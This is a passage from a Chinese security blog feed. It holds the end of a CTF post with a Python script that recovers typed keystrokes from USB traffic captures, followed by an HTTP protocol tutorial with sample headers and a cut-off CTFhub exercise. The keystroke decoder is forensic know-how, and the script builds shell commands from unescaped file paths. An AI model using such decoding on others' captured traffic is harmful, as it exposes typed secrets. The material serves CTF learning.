class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        print(<span class="hljs-string">&quot;Usage : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span>)<br>        print(<span class="hljs-string">&quot;Tips : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        To use this python script , you must install the tshark first.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span>)<br>        print(<span class="hljs-string">&quot;Author : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span>)<br>        print(<span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        Thank you for using.&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-comment"># get data of pcap</span><br>    os.system(<span class="hljs-string">&quot;tshark -r %s -T fields -e usb.capdata &#x27;usb.data_len == 8&#x27; &gt; %s&quot;</span> % (pcapFilePath, DataFileName))<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    print(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br>    <span class="hljs-comment"># clean the temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ python3 UsbKeyboardDataHacker.py key.pcap                                                                                        1 ⨯<br>[-] Unknow Key : 01<br>[-] Unknow Key : 01<br>[+] Found : aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;<br></code></pre></td></tr></table></figure><hr><p>参考文章：<br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">https://blog.csdn.net/qq_45555226/article/details/102810474</a><br><a href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/108717829">https://blog.csdn.net/qq_43431158/article/details/108717829</a></p><p>CTF流量分析总结题目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og<span class="hljs-comment">#list/path=%2F</span><br>提取码：q6ro<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP协议</title>
    <link href="/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>摘要：深入学习HTTP协议</p> <a id="more"></a><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><h2 id="HTTP协议简介"><a href="#HTTP协议简介" class="headerlink" title="HTTP协议简介"></a>HTTP协议简介</h2><p>超文本传输协议 (HTTP-Hypertext transfer protocol) 是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。通常，由HTTP客户端发起一个请求，建立一个到服务器指定端口（默认是80端口）的TCP连接。HTTP服务器则在那个端口监听客户端发送过来的请求。一旦收到请求，服务器（向客户端）发回一个状态行，比如”HTTP/1.1 200 OK”，和（响应的）消息，消息的消息体可能是请求的文件、错误消息、或者其它一些信息。HTTP使用TCP而不是UDP的原因在于（打开一个）一个网页必须传送很多数据，而TCP协议提供传输控制，按顺序组织数据，和错误纠正。</p><p>从层次的角度看，HTTP是面向事务的(transaction-oriented)应用层协议，它是万维网上能够可靠地交换文件(包括文本、声音、图像等各种多媒体文件)的重要基础。</p><p>交互过程如下：<br><img src="https://img-blog.csdnimg.cn/20210329204302530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>http协议思维导图<br><img src="https://img-blog.csdnimg.cn/20210409104101378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="HTTP协议特点"><a href="#HTTP协议特点" class="headerlink" title="HTTP协议特点"></a>HTTP协议特点</h2><p>1.基于请求/响应模型的协议。</p><ul><li>请求和响应必须成对，先有请求后有响应</li></ul><p>2.简单快速</p><ul><li>客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</li></ul><p>3.灵活</p><ul><li>HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</li></ul><p>4.无连接</p><ul><li>每次请求一次，释放一次连接。所以无连接表示每次连接只能处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li></ul><p>5.无状态</p><ul><li>HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>HTTP是基于客户/服务器模式，且面向连接的。典型的HTTP事务处理有如下的过程分为四步：<br>（1）客户与服务器建立连接<br>　　首先客户机与服务器需要建立连接。只要单击某个超级链接，HTTP的工作就开始了。<br>（2）客户向服务器提出请求<br>　　建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。<br>（3）服务器接受请求，并根据请求返回相应的文件作为应答<br>　　服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。<br>（4）客户与服务器关闭连接<br>　　 客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。</p><p>　　如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端。　　</p><h2 id="HTTP协议发展史"><a href="#HTTP协议发展史" class="headerlink" title="HTTP协议发展史"></a>HTTP协议发展史</h2><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>0.9版本是第一个定稿的HTTP版本，相对较为简陋。它有以下特点：</p><ul><li><p>只接受 GET 一种请求方法</p></li><li><p>没有header等描述数据的信息</p></li><li><p>服务器发送完毕，就关闭TCP连接</p></li></ul><p>由于该版本不支持 POST 方法，所以客户端无法向服务器传递太多信息</p><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><p>1.0版本在0.9版本上做出了很多创新和优化，该版本：</p><ul><li><p>增加了新的命令（POST命令和HEADER命令）</p></li><li><p>增加status code（状态码）和header</p></li><li><p>增加多字符集支持、多部分发送、authorization（权限）、cache（缓存）等</p></li></ul><p>这是第一个在通讯中指定版本号的HTTP 协议版本，在这个版本，基本实现了HTTP协议的框架。</p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>1.1版本解决了大量1.0版本的痛点，该版本新增了以下功能：</p><ul><li><p>持久连接（keep alive）</p></li><li><p>管道化（pipeline）</p></li><li><p>host和其他一些命令</p></li></ul><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><p>HTTP2.0的前身是HTTP1.0和HTTP1.1,是HTTP 协议的第二个主要版本，该版本关注于减少延迟时间，从而提高页面加载速度。HTTP/2 是基于 SPDY 协议的，打开一个 TCP 连接并重复使用，这使得许多请求得以并行发送，而无需等待响应。</p><p>HTTP/2.0优势是:</p><ul><li><p>所有数据二进制传输</p></li><li><p>同一链接多个请求不再按照顺序来</p></li><li><p>头信息压缩以及推送等提高效率的功能</p></li></ul><h1 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h1><p>用于HTTP协议交互的信息被称为报文。</p><p>请求端（客户端）的HTTP报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP报文本身是由多行数据构成的字符串文本。HTTP报文大致上可分为报文首部和报文主体两块，两者由最初出现的空行来划分。<br>通常来说，并不一定要有报文主体。</p><p>HTTP报文由三部分组成：</p><p>（1)起始行：<br>报文的第一行就是起始行,用于区分是请求报文还是响应报文，请求报文中开始行叫做请求行，而响应报文中，开始行叫做状态行。在开始行的三个字段之间都用空格分开，结尾处 CRLF 表示回车和换行。</p><p>（2)首部行：<br>起始行后面有零个或多个字段。每个字段都包含一个名字和一个值,为了便于解析,两者之间用冒号(:)来分隔，首部以一个空行结束。<br>用于说明浏览器、服务器或报文主体的一些信息。在每一个首部行中都有首部字段名和它的值，每一行在结束的地方都要有“回车”和“换行”。整个首部行结束时，还有以空行将首部行和后面的实体分开。</p><p>（3)主体：<br>空行之后就是可选的报文主体了，其中包含了所有类型的数据。请求主体是要发送给服务器的数据;响应主体是要返回给客户端的数据。在请求报文中一般不用这个字段，而在响应报文中也可能没有这个字段。</p><h2 id="Request请求报文"><a href="#Request请求报文" class="headerlink" title="Request请求报文"></a>Request请求报文</h2><blockquote><p>  HTTP请求报文——从客户向服务器发送请求报文</p></blockquote><p>  HTTP的请求报文由三部分组成 : 请求行 , 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202511308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>请求行：请求行由请求方法字段、URL字段和HTTP协议版本字段3个字段组成，它们用空格分隔。比如 GET /data/info.html HTTP/1.1。方法字段就是HTTP使用的请求方法，比如常见的GET/POST</li><li>请求头：浏览器向服务器发送请求的时候必须指明请求类型(一般是GET或者 POST)。如有必要，客户程序还可以选择发送其他的请求头。大多数请求头并不是必需的，但Content-Length除外。对于POST请求来说 Content-Length必须出现。</li><li>实体：若方法字段是GET，则此项为空，没有数据。若方法字段是POST,则通常来说此处放置的就是要提交的数据</li></ul><h3 id="请求报文实例"><a href="#请求报文实例" class="headerlink" title="请求报文实例"></a>请求报文实例</h3><p>抓包本地搭建的登陆页面，得到请求头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /<span class="hljs-built_in">test</span>/login.html HTTP/1.1        <span class="hljs-comment">#请求方法为POST，请求URL为/test/login.html，HTTP协议版本为HTTP/1.1</span><br>Host: 127.0.0.1<span class="hljs-comment">#客户机通过这个头告诉服务器，想访问的主机名</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0  <span class="hljs-comment">#指定用户代理服务器的类型。</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2   <span class="hljs-comment">#指出客户浏览器支持的语言是英语（english）</span><br>Accept-Encoding: gzip, deflate        <span class="hljs-comment">#指出发送此请求的浏览器支持哪些压缩编码方式。</span><br>Content-Type: application/x-www-form-urlencoded      <span class="hljs-comment">#表示后面的文档属于什么MIME类型</span><br>Content-Length: 26 <span class="hljs-comment">#表示内容长度</span><br>Origin: http://127.0.0.1     <span class="hljs-comment">#Origin主要是用来说明最初请求是从哪里发起的；</span><br>Connection: close         <span class="hljs-comment">#是在告知服务器本浏览器不想使用永久连接方式（HTTP/1.0使用非永久连接，HTTP/1.1默认使用永久连接）。</span><br>Referer: http://127.0.0.1/<span class="hljs-built_in">test</span>/index.html   <span class="hljs-comment">#客户机通过这个头告诉服务器，它是从哪个资源来访问服务器的</span><br>Cookie: _ga=GA1.1.1592130974.1616653076; bdshare_firstime=1616653211943       <span class="hljs-comment">#客户机通过这个头可以向服务器带数据</span><br>Upgrade-Insecure-Requests: 1        <span class="hljs-comment">#表示能读懂服务器发过来的上面这条信息</span><br><br>username=<span class="hljs-built_in">test</span>&amp;password=123     <span class="hljs-comment">#请求数据</span><br></code></pre></td></tr></table></figure><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>方法字段指出客户请求服务器执行的一般操作。HTTP/1.1中定义了八种请求方法，其中GET、POST、HEAD、是常用请求方法。<br>| 方法    | 描述                                                         |<br>| ——- | ———————————————————— |<br>| GET     | 获取一个URL指定的资源,即资源实体。                           |<br>| POST    | 传输实体主体,向服务器提交数据。                              |<br>| HEAD    | 获取一个指定资源的信息,类似GET方法，区别在于只返回报文首部，不返回报文主体。 |<br>| PUT     | 向服务器提交资源,用来传输文件。                              |<br>| DELETE  | 请求源服务器删除Request-URI标识的资源,用来删除文件。         |<br>| TRACE   | 网络跟踪                                                     |<br>| CONNECT | 与PROXY之间的连接管理,要求用隧道协议连接代理。               |<br>| OPTIONS | 查询能力,询问支持方法返回服务器支持的方法。                  |</p><p><strong>GET和POST之间的区别</strong></p><p>1、GET方法的数据参数是暴露在起始行的URL中的，而POST方法的数据参数是在报文主体中的。<br>2、GET方法相对来说没有POST安全，因为它的数据参数可以直接从URL中获取，但是GET的效率更高。<br>3、GET方法的数据参数大小有一定的限制（1024）（原因也是因为它的数据参数是放在URL中的），而POST对数据大小是没有限制的。<br>其实他们的本质区别是GET是从服务器上请求数据，而POST是向服务器发送数据</p><h3 id="请求报文属性"><a href="#请求报文属性" class="headerlink" title="请求报文属性"></a>请求报文属性</h3><p>请求头部为请求报文添加了一些附加信息，由“名/值”对组成，每行一对，名和值之间使用冒号分隔</p><p>常见请求头如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IP：提供了运行客户端的机器的IP地址<br><br>From：提供了客户端用户的E-mail地址<br><br>Host：给出了接收请求的服务器的主机名和端口号<br><br>Referer：提供了包含当前请求URI的文档的URL，服务器能知道你是从哪个页面过来的<br><br>UA-Color：提供了与客户端显示器的显示颜色有关的信息<br><br>UA-CPU：给出了客户端CPU的类型或制造商<br><br>UA-OS：给出了运行在客户端机器上的操作系统名称及版本<br><br>User-Agent：将发起请求的应用程序名称告知服务器 <br>      <br>Accept：告诉服务器能够发送哪些媒体类型<br><br>Accept-Charset：告诉服务器能够发送哪些字符集<br><br>Accept-Encoding：告诉服务器能够发送哪些编码方式<br><br>Accept-Language：告诉服务器能够发送哪些语言<br><br>TE：告诉服务器可以使用那些扩展传输编码<br><br>Expect：允许客户端列出某请求所要求的服务器行为<br><br>Range：如果服务器支持范围请求，就请求资源的指定范围<br><br>Cookie：客户端用它向服务器传送数据<br><br>Cookie2：用来说明请求端支持的cookie版本<br><br>Upgrade-Insecure-Requests：表示能读懂服务器发过来的上面这条信息，并且在以后发请求的时候不用http而用https<br></code></pre></td></tr></table></figure><h2 id="Response响应报文"><a href="#Response响应报文" class="headerlink" title="Response响应报文"></a>Response响应报文</h2><blockquote><p>  HTTP响应报文——从服务器到客户的回答</p></blockquote><p>   HTTP的请求报文由三部分组成 : 状态行 、 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202534215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>响应行：响应行一般由协议版本、状态码及其描述组成 比如 HTTP/1.1 200 OK。其中协议版本HTTP/1.1或者HTTP/1.0，200就是它的状态码，OK则为它的描述。</li><li>响应头：响应头用于描述服务器的基本信息，以及数据的描述，服务器通过这些数据的描述信息，可以通知客户端如何处理等一会儿它回送的数据。</li><li>响应体：响应体就是响应的消息体，如果是纯数据就是返回纯数据，如果请求的是HTML页面，那么返回的就是HTML代码，如果是JS就是JS代码，如此之类。<h3 id="响应报文实例"><a href="#响应报文实例" class="headerlink" title="响应报文实例"></a>响应报文实例</h3>抓包本地搭建的登陆页面，得到响应头：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP/1.1 200 OK   <span class="hljs-comment">#HTTP协议及版本 状态码</span><br>Date: Mon, 29 Mar 2021 02:57:52 GMT  <span class="hljs-comment">#服务器创建并发送本响应消息的日期和时间。</span><br>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45  <span class="hljs-comment">#服务器和版本号</span><br>Last-Modified: Mon, 29 Mar 2021 02:57:07 GMT  <span class="hljs-comment">#对象本身的创建或最后修改日期或时间</span><br>ETag: <span class="hljs-string">&quot;8e-5bea4098d63cb&quot;</span>   <span class="hljs-comment">#缓存相关的头</span><br>Accept-Ranges: bytes  <span class="hljs-comment">#标识自身支持范围请求(partial requests)</span><br>Content-Length: 142  <span class="hljs-comment">#所发送对象的字节数</span><br>Connection: close    <span class="hljs-comment">#处理完这次请求后是否断开连接还是继续保持连接</span><br>Content-Type: text/html  <span class="hljs-comment">#包含在实体中的对象是HTML文本</span><br><br>&lt;!DOCTYPE html&gt;    <span class="hljs-comment">#实体部分</span><br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;title&gt;succsss&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>Login succsss!!!<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">HTTP 响应代码</a>，状态代码由服务器发出，以响应客户端对服务器的请求。</p><p>请求报文的方法字段是对所请求对象进行的操作，而响应报文的状态码是一个 3 位数字，可以分为以下 5 类 ：</p><table><thead><tr><th>状态码类别</th><th>描述</th></tr></thead><tbody><tr><td>1xx</td><td>收到请求，继续处理。</td></tr><tr><td>2xx</td><td>请求已成功接收，理解和接受</td></tr><tr><td>3xx</td><td>重定向到其它地方</td></tr><tr><td>4xx</td><td>客户的差错，请求包含错误的语法或无法满足。</td></tr><tr><td>5xx</td><td>服务器的差错，服务器无法满足明显有效的请求</td></tr></tbody></table><p>常见的状态码：</p><table><thead><tr><th>状态码</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>表示从客户端发送给服务器的请求被正常处理并返回</td></tr><tr><td>204</td><td>No Content</td><td>表示客户端发送给客户端的请求得到了成功处理，但在返回的响应报文中不含实体的主体部分</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久重定向，表示请求的资源被分配了新的URL，之后应使用更改的URL。</td></tr><tr><td>302</td><td>Found</td><td>临时重定向，表示请求的资源被分配了新的URL，希望本次访问使用新的URL。</td></tr><tr><td>304</td><td>Not Modified</td><td>缓存文件并未过期，还可继续使用，无需再次从服务端获取</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求有语法错误，不能被服务器识别</td></tr><tr><td>401</td><td>Unauthorized</td><td>未经许可，需要通过HTTP认证</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器接收到请求，但是拒绝提供服务。</td></tr><tr><td>404</td><td>Not Found</td><td>请求资源不存在</td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误</td></tr><tr><td>503</td><td>Server Unavailable</td><td>服务器暂时不能处理客户端的请求</td></tr></tbody></table><h3 id="响应报文属性"><a href="#响应报文属性" class="headerlink" title="响应报文属性"></a>响应报文属性</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml">Age：(从最初创建开始)响应持续时间<br><br>Public：服务器为其资源支持的请求方法列表<br><br>Retry-After：如果资源不可用的话，在此日期或时间重试<br><br>Server：服务器应用程序软件的名称和版本<br><br>Title：对HTML文档来说，就是HTML文档的源端给出的标题<br><br>Warning：比原因短语更详细一些的警告报文<br><br>ETag：一个代表响应服务端资源（如页面）版本的报文头属性，如果某个服务端资源发生变化了，这个ETag就会相应发生变化。<br><br>Accept-Ranges：对此资源来说，服务器可接受的范围类型<br><br>Vary：服务器会根据这些首部的内容挑选出最适合的资源版本发送给客户端<br><br>Proxy-Authenticate：来自代理的对客户端的质询列表<br><br>Set-Cookie：服务端可以设置客户端的Cookie，以便服务器对客户端进行标识。<br><br>Set-Cookie2：与Set-Cookie类似<br><br>WWW-Authenticate：来自服务器的对客户端的质询列表<br><br></code></pre></td></tr></table></figure><h1 id="HTTP协议实战练习"><a href="#HTTP协议实战练习" class="headerlink" title="HTTP协议实战练习"></a>HTTP协议实战练习</h1><p>题目来自CTFhub靶场：Web前置技能-HTTP协议</p><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p><p><img src="https://img-blog.csdnimg.cn/20210329161254214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法一：<br>burpsite抓包，自定义CTFHUB方法请求 index.php 即可拿到 flag。<br><img src="https://img-blog.csdnimg.cn/20210329161305347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法二：<br>使用curl命令查看服务器的返回信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v -X CTFHUB 